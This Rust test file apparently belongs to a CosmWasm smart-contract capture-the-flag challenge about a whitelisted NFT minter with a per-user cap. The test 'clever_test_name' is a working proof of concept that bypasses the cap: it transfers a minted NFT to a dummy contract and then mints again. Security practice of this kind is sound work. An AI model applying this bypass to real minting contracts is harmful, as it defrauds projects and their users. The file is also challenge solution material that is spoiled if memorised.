#[cfg(test)]
pub mod tests {
    use crate::{
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
        state::{Config, Whitelist},
    };
    use cosmwasm_std::{Addr, Empty};

    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_code() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        )
        .with_reply(crate::contract::reply);
        Box::new(contract)
    }

    fn cw721_code() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            cw721_base::entry::execute,
            cw721_base::entry::instantiate,
            cw721_base::entry::query,
        );
        Box::new(contract)
    }

    pub const ADMIN: &str = "admin";
    pub const USER1: &str = "user1";
    pub const USER2: &str = "user2";
    pub const USER3: &str = "user3";

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let challenge_id = app.store_code(challenge_code());
        let cw_721_id = app.store_code(cw721_code());

        // Init challenge
        let challenge_inst = InstantiateMsg {
            cw721_code_id: cw_721_id,
            mint_per_user: 3,
            whitelisted_users: vec![USER1.to_owned(), USER2.to_owned(), USER3.to_owned()],
        };

        let contract_addr = app
            .instantiate_contract(
                challenge_id,
                Addr::unchecked(ADMIN),
                &challenge_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        (app, contract_addr)
    }

    
    /// Same logic as `proper_instantiate` except also returns a "dummy contract"
    /// that will hold the exploiters NFTs for them
    pub fn proper_instantiate_w_dummy() -> (App, Addr, Addr) {
        let mut app = App::default();
        let challenge_id = app.store_code(challenge_code());
        let cw_721_id = app.store_code(cw721_code());

        // Init challenge
        let challenge_inst = InstantiateMsg {
            cw721_code_id: cw_721_id,
            mint_per_user: 3,
            whitelisted_users: vec![USER1.to_owned(), USER2.to_owned(), USER3.to_owned()],
        };

        let contract_addr = app
            .instantiate_contract(
                challenge_id,
                Addr::unchecked(ADMIN),
                &challenge_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        // For this test it doesn't matter what the dummy contract does,
        // in a real world exploit it would simply hold the user's NFTs for them
        let dummy_addr = app
            .instantiate_contract(
                challenge_id,
                Addr::unchecked(USER1),
                &challenge_inst,
                &[],
                "dummy",
                None
            ).unwrap();

        (app, contract_addr, dummy_addr)
    }

    #[test]
    fn basic_flow() {
        let (mut app, contract_addr) = proper_instantiate();

        // query config
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();

        // query whitelisted users
        let whitelist: Whitelist = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Whitelist {})
            .unwrap();

        assert!(whitelist.users.contains(&USER1.to_owned()));
        assert!(whitelist.users.contains(&USER2.to_owned()));
        assert!(whitelist.users.contains(&USER3.to_owned()));

        let user4 = "user4";

        // mint to non-whitelisted user
        app.execute_contract(
            Addr::unchecked(user4),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap_err();

        // mint to whitelisted user until max limit
        assert_eq!(config.mint_per_user, 3);

        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();

        // exceed max limit fails
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap_err();

        // other users can mint freely
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();

        // ensure total tokens increases
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();

        assert_eq!(config.total_tokens, 4);
    }
    
    #[test]
    fn clever_test_name() {
        let (mut app, contract_addr, dummy_addr) = proper_instantiate_w_dummy();

        // query config
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();

        // query whitelisted users
        let whitelist: Whitelist = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Whitelist {})
            .unwrap();

        assert!(whitelist.users.contains(&USER1.to_owned()));
        assert!(whitelist.users.contains(&USER2.to_owned()));
        assert!(whitelist.users.contains(&USER3.to_owned()));

        // mint to whitelisted user until max limit
        assert_eq!(config.mint_per_user, 3);

        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();

        // exceed max limit fails
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap_err();

        // Check what NFTs USER1 owns
        let user1_nfts: cw721::TokensResponse = app
            .wrap()
            .query_wasm_smart(config.nft_contract.clone(), &cw721_base::QueryMsg::Tokens::<Empty> { 
                owner: USER1.to_string(), 
                start_after: None, 
                limit: None 
            })
            .unwrap();
        assert!(user1_nfts.tokens.len() == 3);

        // USER1 sends an NFT to a dummy contract
        let nft_to_send = user1_nfts.tokens[0].clone();
        app.execute_contract(
            Addr::unchecked(USER1),
            config.nft_contract.clone(),
            // would likely use SendNft in real world scenario
            &cw721_base::ExecuteMsg::TransferNft::<Empty, Empty> { 
                recipient: dummy_addr.clone().to_string(), 
                token_id: nft_to_send.clone()
            },
            &[]
        ).unwrap();

        // Verify that dummy contract has NFT
        let dummy_nfts: cw721::TokensResponse = app
            .wrap()
            .query_wasm_smart(config.nft_contract.clone(), &cw721_base::QueryMsg::Tokens::<Empty> { 
                owner: dummy_addr.clone().to_string(), 
                start_after: None, 
                limit: None 
            })
            .unwrap();
        assert!(dummy_nfts.tokens.len() == 1);
        assert!(dummy_nfts.tokens.contains(&nft_to_send));

        // Verify that USER1 can mint another NFT, bypassing the limit
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();

        // Ensure there is now 4 NFTs
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.total_tokens, 4);
    }

}
